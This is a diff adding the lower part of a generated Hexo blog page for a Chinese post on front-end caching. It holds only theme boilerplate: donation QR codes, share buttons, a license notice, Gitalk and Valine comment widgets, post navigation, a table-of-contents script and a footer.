+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《深入浅出前端缓存》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2021/04/27/深入浅出前端缓存/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                浅夏晴空
+            </a> 采用
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'de8dfcea77a9e87de17a',
+        clientSecret: '569b91fd16e2f3972943f6907219b5ca2984aa1b',
+        repo: 'gongchenghuigch.github.io',
+        owner: 'gongchenghuigch',
+        admin: "gongchenghuigch",
+        id: '2021-04-27T14-15-09',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments input[type=text],
+    #vcomments input[type=email],
+    #vcomments input[type=url],
+    #vcomments textarea {
+        box-sizing: border-box;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #42b983;
+        font-weight: 500;
+        text-decoration: underline;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div id="vcomments" class="card-content"></div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '',
+        appKey: '',
+        notify: 'true' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/04/27/ES新特性/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="ES新特性">
+                        
+                        <span class="card-title">ES新特性</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            ES6（2015）1. 类（class）class Man {
+  constructor(name) {
+    this.name = '小豪';
+  }
+  console() {
+    console.log(this.name)
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-04-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ECMAScript/" class="post-category" target="_blank">
+                                    ECMAScript
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/JavaScript/" target="_blank">
+                        <span class="chip bg-color">JavaScript</span>
+                    </a>
+                    
+                    <a href="/tags/es/" target="_blank">
+                        <span class="chip bg-color">es</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/04/27/JS中的prototype、__proto__与constructor（图解）/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="JS 中的 prototype、__proto__与constructor（图解）">
+                        
+                        <span class="card-title">JS 中的 prototype、__proto__与constructor（图解）</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            1. 前言作为一名前端工程师，必须搞懂JS中的prototype、__proto__与constructor属性，相信很多初学者对这些属性存在许多困惑，容易把它们混淆，本文旨在帮助大家理清它们之间的关系并彻底搞懂它们。这里说明一点，__pr
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-04-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/JavaScript/" class="post-category" target="_blank">
+                                    JavaScript
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/前端/" target="_blank">
+                        <span class="chip bg-color">前端</span>
+                    </a>
+                    
+                    <a href="/tags/JavaScript/" target="_blank">
+                        <span class="chip bg-color">JavaScript</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            <span id="sitetime"></span> <br>
+            本站由&copy;<a href="https://gongchenghuigch.github.io/" target="_blank">gongchenghui</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">214.1k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:gongch0719@163.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1134929850" class="tooltipped" data-tooltip="QQ联系我: 1134929850" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+<script language = javascript >
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        var t1 = Date.UTC(2018, 08, 11, 00, 00, 00); //北京时间2018-2-13 00:00:00 
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond); 
+        var diff = t2 - t1; var diffYears = Math.floor(diff / years); 
+        var diffDays = Math.floor((diff / days) - diffYears * 365); 
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours); 
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes); 
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds); document.getElementById("sitetime").innerHTML = "本站已运行 " +diffYears+" 年 "+diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒"; 
+    } 
+	siteTime(); 
+</script>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+    <script src="/libs/others/clicklove.js"></script>
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
